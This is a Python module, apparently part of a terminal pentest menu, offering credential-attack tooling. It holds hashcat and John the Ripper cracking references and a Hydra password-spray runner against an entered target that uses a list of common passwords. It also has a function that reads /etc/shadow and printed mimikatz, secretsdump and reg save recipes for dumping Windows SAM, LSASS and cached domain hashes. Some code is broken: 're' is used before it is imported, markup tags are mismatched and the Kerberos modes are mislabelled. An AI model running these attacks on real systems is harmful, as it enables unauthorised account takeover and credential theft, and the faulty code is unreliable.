# credential tools - hashcat modes, john, password spray, cracking reference
import os, subprocess, hashlib, secrets, string
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt
from rich import box

console = Console()

def clr():
    os.system('cls' if os.name == 'nt' else 'clear')

def runcmd(cmd, t=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return p.stdout + p.stderr
    except:
        return "[!] failed"

def pause():
    Prompt.ask("\n[dim]enter to continue[/dim]")


def hashcat_modes():
    clr()
    console.print("[bold red]=== HASHCAT MODE REFERENCE ===[/bold red]\n")
    
    modes = Table(box=box.SIMPLE, title="Common Hashcat Modes")
    modes.add_column("Mode", style="bold yellow", width=6)
    modes.add_column("Hash Type")
    modes.add_column("Example")
    
    hash_modes = [
        ("0", "MD5", "5d41402abc4b2a76b9719d911017c592"),
        ("100", "SHA1", "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d"),
        ("1400", "SHA-256", "2cf24dba5fb0a30e26e83b2ac5b9e29e..."),
        ("1700", "SHA-512", "9b71d224bd62f3785d96d46ad3ea3d73..."),
        ("3200", "bcrypt", "$2b$10$..."),
        ("1000", "NTLM", "a4f49c406510bdca..."),
        ("3000", "LM", ""),
        ("5500", "NetNTLMv1", ""),
        ("5600", "NetNTLMv2", ""),
        ("7500", "Kerberos 5 AS-REQ", ""),
        ("13100", "Kerberos 5 TGS-REP", ""),
        ("18200", "Kerberos 5 AS-REP", ""),
        ("7300", "IPMI2 RAKP HMAC-SHA1", ""),
        ("11300", "Bitcoin/Litecoin wallet.dat", ""),
        ("15300", "DPAPI masterkey", ""),
        ("15600", "Ethereum Wallet", ""),
        ("22000", "WPA-PBKDF2-PMKID+EAPOL", ""),
        ("22001", "WPA-PMK-PMKID+EAPOL", ""),
        ("9600", "MS Office", ""),
        ("9700", "MS Office 2007", ""),
        ("9800", "MS Office 2010", ""),
        ("10400", "PDF 1.4 - 1.6", ""),
        ("11600", "7-Zip", ""),
        ("12500", "RAR3", ""),
        ("13000", "RAR5", ""),
    ]
    
    for mode, name, example in hash_modes:
        modes.add_row(mode, name, example)
    
    console.print(modes)
    
    console.print("\n[bold yellow]common commands:[/bold yellow]\n")
    console.print("  [cyan]hashcat -m 0 hash.txt wordlist.txt[/cyan]           # MD5")
    console.print("  [cyan]hashcat -m 1000 hash.txt wordlist.txt[/cyan]        # NTLM")
    console.print("  [cyan]hashcat -m 1400 hash.txt wordlist.txt[/cyan]        # SHA-256")
    console.print("  [cyan]hashcat -m 22000 hash.txt wordlist.txt[/cyan]       # WPA")
    console.print("  [cyan]hashcat -m 3200 hash.txt wordlist.txt[/cyan]        # bcrypt")
    console.print("  [cyan]hashcat --show -m 0 hash.txt[/cyan]                # show cracked")
    console.print("  [cyan]hashcat -I[/cyan]                                    # show GPU info")
    
    pause()

def john_modes():
    clr()
    console.print("[bold red]=== JOHN THE RIPPER REFERENCE ===[/bold red]\n")
    
    console.print("""[yellow]--- common john commands ---[/yellow]

  [cyan]john hash.txt[/cyan]                          - auto-detect and crack
  [cyan]john --wordlist=wordlist.txt hash.txt[/cyan]   - dictionary attack
  [cyan]john --show hash.txt[/cyan]                    - show cracked
  [cyan]john --list=formats[/cyan]                     - all supported formats

[yellow]--- format-specific ---[/y]

  [cyan]john --format=raw-md5 hash.txt[/cyan]
  [cyan]john --format=raw-sha256 hash.txt[/cyan]
  [cyan]john --format=nt hash.txt[/cyan]               # NTLM
  [cyan]john --format=bcrypt hash.txt[/cyan]
  [cyan]john --format=sha512crypt hash.txt[/cyan]       # /etc/shadow

[y]--- hash extraction ---[/y]

  # linux shadow hashes
  unshadow /etc/passwd /etc/shadow > hashes.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

  # windows SAM
  # dump with: mimikatz # lsadump::sam
  # or: secretsdump.py user:pass@target

  # NTLM from memory
  # mimikatz # sekurlsa::logonpasswords

[y]--- rules (better cracking) ---[/y]

  [cyan]john --wordlist=wordlist.txt --rules=best hash.txt[/cyan]
  [cyan]john --wordlist=wordlist.txt --rules=jumbo hash.txt[/cyan]
""")
    pause()

def password_spray():
    clr()
    console.print("[bold red]=== PASSWORD SPRAYING ===[/bold red]\n")
    
    target = Prompt.ask("[cyan]target IP/hostname[/cyan]")
    service = Prompt.ask("[cyan]service[/cyan]", choices=["ssh", "smb", "rdp", "http"], default="ssh")
    userlist = Prompt.ask("[cyan]userlist path (one user per line)[/cyan]", default="/usr/share/seclists/Usernames/top-usernames-shortlist.txt")
    
    console.print("\n[yellow]common passwords for spray (one per line):[/yellow]")
    console.print("  Password1")
    console.print("  Welcome1")
    console.print("  Company1")
    console.print("  Summer2024!")
    console.print("  Winter2024!")
    console.print("  P@ssw0rd")
    
    passfile = Prompt.ask("\n[cyan]password file (or type password to spray)[/cyan]", default="Password1")
    
    if os.path.exists("/usr/bin/hydra"):
        if service == "ssh":
            cmd = f"hydra -L {userlist} -P {passfile if os.path.exists(passfile) else '/dev/stdin'} {target} ssh -t 4"
        elif service == "smb":
            cmd = f"hydra -L {userlist} -P {passfile if os.path.exists(passfile) else '/dev/stdin'} {target} smb -t 4"
        elif service == "rdp":
            cmd = f"hydra -L {userlist} -P {passfile if os.path.exists(passfile) else '/dev/stdin'} {target} rdp -t 4"
        else:
            cmd = f"hydra -L {userlist} -P {passfile if os.path.exists(passfile) else '/dev/stdin'} {target} http-get -t 4"
        
        console.print(f"\n[yellow]command:[/yellow]")
        console.print(f"  [cyan]{cmd}[/cyan]")
        
        run = Prompt.ask("\n[cyan]run now? (y/n)[/cyan]", default="n")
        if run.lower() == "y":
            console.print(runcmd(cmd, t=300))
    else:
        console.print("[red]hydra not found. install: pacman -S hydra[/red]")
        console.print(f"\n[yellow]manual command:[/yellow]")
        console.print(f"  [cyan]hydra -L {userlist} -p '{passfile}' {target} {service}[/cyan]")
    
    pause()

def hash_identifier():
    clr()
    console.print("[bold red]=== HASH IDENTIFIER ===[/bold red]\n")
    h = Prompt.ask("[cyan]paste hash[/cyan]").strip()
    hl = len(h)
    
    console.print(f"\n[yellow]length: {hl} chars[/yellow]\n")
    
    known = {
        16: ["CRC32", "MySQL 4.1+", "MD4 (half)"],
        32: ["MD5", "NTLM", "MD4", "MD2"],
        40: ["SHA-1", "RIPEMD-160", "MySQL (old)"],
        41: ["MySQL 4.1+ (with $)"],
        56: ["SHA-224"],
        60: ["bcrypt ($2a/$2b/$2y)"],
        64: ["SHA-256", "SHA3-256", "BLAKE2-256", "RIPEMD-256"],
        86: ["SHA-384 (with $1$)"],
        96: ["SHA-384"],
        128: ["SHA-512", "SHA3-512", "BLAKE2-512"],
        131: ["NTLM (with $3$)"],
        34: ["MD5 ($1$) salted"],
        35: ["MD5 ($apr1$) Apache"],
    }
    
    if hl in known:
        console.print("[green]likely hash types:[/green]")
        for ht in known[hl]:
            console.print(f"  - {ht}")
    
    # prefix checks
    if h.startswith("$2"):
        console.print("[green]  detected: bcrypt[/green]")
    elif h.startswith("$argon2"):
        console.print("[green]  detected: Argon2[/green]")
    elif h.startswith("$pbkdf2"):
        console.print("[green]  detected: PBKDF2[/green]")
    elif h.startswith("$6$"):
        console.print("[green]  detected: SHA-512 crypt (Linux)[/green]")
    elif h.startswith("$5$"):
        console.print("[green]  detected: SHA-256 crypt (Linux)[/green]")
    elif h.startswith("$1$"):
        console.print("[green]  detected: MD5 crypt (Linux)[/green]")
    elif h.startswith("$apr1$"):
        console.print("[green]  detected: Apache MD5[/green]")
    elif h.startswith("$2b$") or h.startswith("$2a$"):
        console.print("[green]  detected: bcrypt[/green]")
    elif h.startswith("0x"):
        console.print("[green]  detected: hex-encoded (maybe SHA1 of cert?)[/green]")
    elif re.match(r'^[a-f0-9]+$', h):
        console.print("[green]  format: lowercase hex[/green]")
    elif re.match(r'^[A-F0-9]+$', h):
        console.print("[green]  format: uppercase hex[/green]")
    
    console.print(f"\n[yellow]crack with:[/yellow]")
    console.print(f"  hashcat -m <mode> hash.txt wordlist.txt")
    console.print(f"  john --format=<type> hash.txt")
    
    import re
    pause()

def shadow_dump():
    clr()
    console.print("[bold red]=== LINUX SHADOW DUMP ===[/bold red]\n")
    console.print("[yellow]requires root[/yellow]\n")
    
    console.print("[bold yellow]--- /etc/shadow ---[/bold yellow]")
    console.print(runcmd("cat /etc/shadow 2>/dev/null | head -20"))
    
    console.print("\n[bold yellow]--- unshadow (for john) ---[/bold yellow]")
    console.print("[cyan]sudo unshadow /etc/passwd /etc/shadow > hashes.txt[/cyan]")
    
    console.print("\n[bold yellow]--- quick crack ---[/cyan]")
    console.print("[cyan]john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt[/cyan]")
    console.print("[cyan]hashcat -m 1800 hashes.txt wordlist.txt  # SHA-512 crypt[/cyan]")
    
    pause()

def sam_dump_info():
    clr()
    console.print("[bold red]=== WINDOWS SAM DUMP INFO ===[/bold red]\n")
    console.print("""[yellow]methods to dump Windows password hashes:[/y]

[i]--- mimikatz (live system) ---[/i]
  privilege::debug
  sekurlsa::logonpasswords
  
  # SAM dump
  lsadump::sam
  lsadump::sam /system:SYSTEM /sam:SAM
  
  # cached domain credentials
  lsadump::cache

[i]--- secretsdump.py (remote) ---[/i]
  secretsdump.py domain/user:password@target
  secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

[i]--- reg save (remote) ---[/i]
  reg save hklm\sam sam.reg
  reg save hklm\system system.reg  
  reg save hklm\security security.reg
  secretsdump.py -sam sam.reg -system system.reg -security security.reg LOCAL

[i]--- crack the hashes ---[/i]
  # NTLM
  hashcat -m 1000 ntlm_hashes.txt wordlist.txt
  john --format=nt ntlm_hashes.txt
  
  # kerberos tickets  
  hashcat -m 13100 tgs.txt wordlist.txt  # AS-REP
  hashcat -m 13100 tgs.txt wordlist.txt  # TGS-REP
""")
    pause()


def run():
    while True:
        clr()
        console.print("[bold red]=== CREDENTIALS ===[/bold red]\n")
        from rich.table import Table
        t = Table(show_header=False, box=box.ROUNDED, border_style="red", padding=(0, 2))
        t.add_column("", style="bold yellow", width=4)
        t.add_column("")
        opts = [
            "Hashcat Mode Reference",
            "John the Ripper Reference",
            "Password Spraying (Hydra)",
            "Hash Identifier",
            "Linux Shadow Dump",
            "Windows SAM Dump Info",
        ]
        for i, o in enumerate(opts, 1):
            t.add_row(str(i), o)
        t.add_row("", "")
        t.add_row("b", "Back")
        console.print(Panel(t, title="[bold]CREDENTIALS[/bold]", border_style="red"))
        
        try:
            c = int(Prompt.ask("[bold yellow]>[/bold yellow]"))
        except ValueError:
            c = 0
        
        if c == 1: hashcat_modes()
        elif c == 2: john_modes()
        elif c == 3: password_spray()
        elif c == 4: hash_identifier()
        elif c == 5: shadow_dump()
        elif c == 6: sam_dump_info()
        elif c == 0: return
